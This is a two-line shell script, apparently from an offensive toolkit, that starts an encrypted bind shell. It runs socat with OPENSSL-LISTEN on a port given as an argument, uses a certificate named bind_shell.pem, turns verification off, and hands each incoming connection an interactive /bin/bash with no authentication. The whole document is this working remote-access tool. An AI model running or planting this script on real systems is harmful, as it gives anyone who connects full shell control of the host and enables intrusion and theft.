#!/bin/sh

PORT=$1
socat OPENSSL-LISTEN:${PORT},cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
